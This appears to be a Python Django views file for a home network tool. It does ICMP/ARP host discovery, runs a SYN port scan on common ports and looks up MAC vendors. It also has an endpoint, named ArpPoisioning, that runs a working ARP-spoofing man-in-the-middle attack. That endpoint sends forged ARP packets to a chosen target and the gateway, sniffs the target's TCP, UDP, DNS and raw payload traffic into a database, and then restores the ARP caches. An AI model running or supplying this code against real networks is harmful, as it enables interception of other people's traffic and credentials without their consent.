import scapy.all as scapy
import requests
from ipaddress import IPv4Network
from .models import Device
from .models import Packet
from django.shortcuts import get_object_or_404
from rest_framework.decorators import api_view
from rest_framework.response import Response
from .serializers import DeviceSerializer 
from .serializers import PacketSerializer 
from rest_framework import status
from django.utils import timezone
import concurrent.futures
import json
import os
from itertools import repeat
import time

COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,62078,8009,9080,1080,9000,88]
isAttacking = False

@api_view(['GET'])
def DeviceList(request):
    devices = Device.objects.all()
    serializer = DeviceSerializer(devices, many=True)
    return Response(serializer.data)

@api_view(['GET'])
def PacketProtocolAmount(request):
    print("EHER")
    packets = Packet.objects.all()
    TCP = packets.filter(packet_type="TCP")
    ARP = packets.filter(packet_type="ARP")
    DNS = packets.filter(packet_type="DNS")
    ICMP = packets.filter(packet_type="ICMP")
    UDP = packets.filter(packet_type="UDP")
    protocolAmounts = {"TCP":TCP.count(),"ARP":ARP.count(),"DNS":DNS.count(),"ICMP":ICMP.count(),"UDP":UDP.count()}
    return Response(protocolAmounts)

@api_view(['GET'])
def PacketList(request):
    packets = Packet.objects.all()
    serializer = PacketSerializer(packets, many=True)
    return Response(serializer.data)

def PortScanner(device):
    src_port = 56235
    open_ports = ""
    for port in COMMON_PORTS:
        response = scapy.sr1(scapy.IP(dst=device.ip)/scapy.TCP(sport=src_port, dport=port, flags="S"), timeout=1)
        if(response != None and response.getlayer(scapy.TCP).flags == "SA"):
            # TCP:RA --> CLOSED
            # TCP:SA --> OPEN (SYN-ACK)
            open_ports += str(port) + "|"
    port_device = Device.objects.get(ip=str(device.ip))
    port_device.open_ports = open_ports
    port_device.save()
    
def DeviceThreadedScanner(in_ip, defaultGateway):
    ip = defaultGateway+str(in_ip)
    response = scapy.sr1(scapy.IP(dst=(ip))/scapy.ICMP(),timeout=1, verbose=0)
    if(response is None):
        print(f"{ip} is not up")
    else:
        print(f"{ip} is up") 

        # create or update device 
        obj, created = Device.objects.get_or_create(ip=str(ip))
        if created == False:
            # Update last seen 
            obj.last_seen = timezone.localtime(timezone.now())
            obj.is_new = False
        else:
            obj.is_new = True

        obj.save()

        # ARP SCAN
        response, unanswered = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=(ip)),timeout=1)
        if(response != None):
            try:
                device = Device.objects.get(ip=str(ip))
                device.mac = response[0][1].hwsrc
                device.save()

                # Get and Set MAC vendor in the database
                print(device.mac)
                GetMacVendor(device.mac)
            except Device.DoesNotExist:
                device = None
        
        


@api_view(['GET'])
def DeviceScan(request):
    gateway = GetDefaultGatewayFromConfig()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(DeviceThreadedScanner, list(range(256)), repeat(gateway))

    allDevices = Device.objects.all()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(PortScanner, allDevices)

    return Response(status.HTTP_200_OK)


@api_view(['POST'])
def UpdateAlias(request):
    serializer = DeviceSerializer(data=request.data)
    print(request.data)
    print(request.data["ip"])
    if serializer.is_valid():
        device = Device.objects.get(ip=request.data["ip"])
        device.alias = request.data["alias"]
        device.save()
    return Response(serializer.data)

@api_view(['POST'])
def FixARP(request):
    print("fixing arp for ", request.data["mac_fix"])
    fix_mac = request.data["mac_fix"]
    fix_ip = request.data["ip_fix"]
    gateway_ip = (request.data["gateway"])
    gateway = Device.objects.get(ip=gateway_ip)
    gateway_mac = (gateway.mac)
    
    # pdst = destination ip
    # hwdst = destination mac
    # psrc = source ip
    # hwsrc = source mac
    # op="who-has" makes it easier to read the ARP packet in wireshark

    # This packet is sending an ARP request to the gateway saying the correct location of the MAC address I am trying to fix
    fixARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=fix_ip, hwsrc=fix_mac)
    scapy.send(fixARP_packet)

    # This packet is sending an ARP request to the device I want to fix saying the correct location of the gateway
    fixARP_packet = scapy.ARP(op="who-has", pdst=fix_ip, hwdst=fix_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(fixARP_packet)
    return Response(status.HTTP_200_OK)

@api_view(['POST'])
def UpdateGateway(request):
    print(request.data['gateway'])
    dirname = os.path.dirname(__file__)
    filename = os.path.join(dirname, '../../config.json')
    data = {'settings': [{'default_gateway':request.data['gateway']}]}
    json_string = json.dumps(data)
    with open(filename,'w') as f:
        f.write(json_string)
    return Response(status=200)

@api_view(['POST'])
def ArpPoisioning(request):
    adversary_mac = (request.data["adversary_mac"])
    adversary_ip = (request.data["adversary_ip"])
    gateway_ip = (request.data["gateway"])
    gateway = Device.objects.get(ip=gateway_ip)
    gateway_mac = (gateway.mac)
    global isAttacking
    isAttacking = (request.data["isAttacking"])

    print(gateway_mac)
    print(gateway_ip)
    print(adversary_ip)
    print(adversary_mac)

    # pdst = destination ip
    # hwdst = destination mac
    # psrc = source ip
    # op="who-has" makes it easier to read the ARP packet in wireshark

    while isAttacking == False: 

        # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
        adversaryARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
        scapy.send(adversaryARP_packet)

        # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
        gatewayARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
        scapy.send(gatewayARP_packet)

        # PacketList 
        pcap = scapy.sniff(count=5)
        for packet in pcap:
            print(packet.show())
            doSavePacket = False
            if(packet.haslayer(scapy.ARP)): # ARP is layer 2, so we need to capture the frame before we go into the check if the frame has an IP layer
                new_packet = Packet.objects.create()
                # Ethernet Packet
                ETHERNET_frame = packet.getlayer(scapy.Ether)
                ETHERNET_frame_destination = ETHERNET_frame.dst
                ETHERNET_frame_source = ETHERNET_frame.src

                # Put Ethernet Packet in Database
                new_packet.ethernet_destination = ETHERNET_frame_destination
                new_packet.ethernet_source = ETHERNET_frame_source

                # ARP Packet
                arp_packet = packet.getlayer(scapy.ARP)
                ARP_source_mac = arp_packet.hwsrc
                ARP_destination_mac = arp_packet.hwdst
                ARP_source_ip = arp_packet.psrc
                ARP_destination_ip = arp_packet.pdst

                # Put dest and src Packet in Database
                new_packet.ip_destination = arp_packet.pdst
                new_packet.ip_source = arp_packet.psrc

                # Put ARP Packet in Database
                new_packet.arp_source_mac = ARP_source_mac
                new_packet.arp_destination_mac = ARP_destination_mac
                new_packet.arp_source_ip = ARP_source_ip
                new_packet.arp_destination_ip = ARP_destination_ip

                new_packet.packet_type = "ARP"
                new_packet.save()
            if(packet.haslayer(scapy.IP)):
                IP_packet = packet.getlayer(scapy.IP)
                if(IP_packet.dst == adversary_ip or IP_packet.src == adversary_ip): # We only want to get packets frame the person we are attacking. there is no point on capturing our own data, it will only make things more crowded
                    new_packet = Packet.objects.create()
                    if(packet.haslayer(scapy.Ether)):
                        # Ethernet Packet
                        ETHERNET_frame = packet.getlayer(scapy.Ether)
                        ETHERNET_frame_destination = ETHERNET_frame.dst
                        ETHERNET_frame_source = ETHERNET_frame.src

                        # Put Ethernet Packet in Database
                        new_packet.ethernet_destination = ETHERNET_frame_destination
                        new_packet.ethernet_source = ETHERNET_frame_source
                    if(packet.haslayer(scapy.IP)):
                        # IP Packet
                        IP_packet = packet.getlayer(scapy.IP)
                        IP_packet_source = IP_packet.src
                        IP_packet_destination = IP_packet.dst

                        # Put IP Packet in Database
                        new_packet.ip_destination = IP_packet_destination
                        new_packet.ip_source = IP_packet_source
                    if(packet.haslayer(scapy.TCP)):
                        # TCP Packet
                        tcp_packet = packet.getlayer(scapy.TCP)
                        TCP_source_port = tcp_packet.sport
                        TCP_destination_port = tcp_packet.dport
                        TCP_flag = tcp_packet.flags

                        # Put TCP Packet in Database
                        new_packet.tcp_destination_port = TCP_destination_port
                        new_packet.tcp_source_port = TCP_source_port
                        new_packet.tcp_flag = TCP_flag

                        new_packet.packet_type = "TCP"
                        doSavePacket = True

                        if(packet.haslayer(scapy.Raw)):
                            # RAW Packet
                            raw_packet = packet.getlayer(scapy.Raw)

                            # Put RAW Packet in Database
                            new_packet.raw_packet_data = raw_packet


                    if(packet.haslayer(scapy.UDP)):
                        # UDP Packet
                        udp_packet = packet.getlayer(scapy.UDP)
                        UDP_source_port = udp_packet.sport
                        UDP_destination_port = udp_packet.dport

                        # Put UPP Packet in Database
                        new_packet.udp_destination_port = UDP_destination_port
                        new_packet.udp_source_port = UDP_source_port

                        new_packet.packet_type = "UDP"
                        doSavePacket = True

                        if(packet.haslayer(scapy.Raw)):
                            # RAW Packet
                            raw_packet = packet.getlayer(scapy.Raw)

                            # Put RAW Packet in Database
                            new_packet.raw_packet_data = raw_packet


                    if(packet.haslayer(scapy.ICMP)):
                        # ICMP Packet
                        icmp_packet = packet.getlayer(scapy.ICMP)

                        # Put ICMP Packet in Database
                        new_packet.icmp_packet_type = icmp_packet.type

                        new_packet.packet_type = "ICMP"
                        doSavePacket = True
                    
                    if(packet.haslayer(scapy.DNS)):
                        # DNS Packet
                        dns_packet = packet.getlayer(scapy.DNS)
                        dns_packet_opcode = dns_packet.opcode
                        dns_packet_qd = dns_packet.qd

                        # Put DNS Packet in Database
                        new_packet.dns_packet_opcode = dns_packet_opcode
                        new_packet.dns_packet_qd = dns_packet_qd.getlayer(scapy.DNSQR).qname

                        new_packet.packet_type = "DNS"
                        doSavePacket = True
                    print("SAVING TO DATABASE")
                    if doSavePacket:
                        new_packet.save()
                

    # reset the ARP cache table for the device being attacked and the gateway
    # This packet is sending an ARP request to the gateway saying the correct location of the MAC address I am trying to fix
    fixARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip, hwsrc=adversary_mac)
    scapy.send(fixARP_packet)

    # This packet is sending an ARP request to the device I want to fix saying the correct location of the gateway
    fixARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(fixARP_packet)
    return Response(status=200)
    


@api_view(['DELETE'])
def DeleteDatabase(self):
    Device.objects.all().delete()
    Packet.objects.all().delete()
    return Response(status=200)


def GetDefaultGatewayFromConfig():
    dirname = os.path.dirname(__file__)
    filename = os.path.join(dirname, '../../config.json')
    with open(filename,'r') as f:
        data = json.load(f)
        gateway = data["settings"][0]["default_gateway"]
        lastIndex = gateway.rfind('.')
        return gateway[:lastIndex]+'.'

def GetMacVendor(mac_address):
    url = "https://api.macvendors.com/"
    response = requests.get(url+mac_address)
    print(response)
    if(response.status_code == 200):
        device = Device.objects.get(mac=str(mac_address))
        device.mac_vendor = response.content.decode()
        device.save()

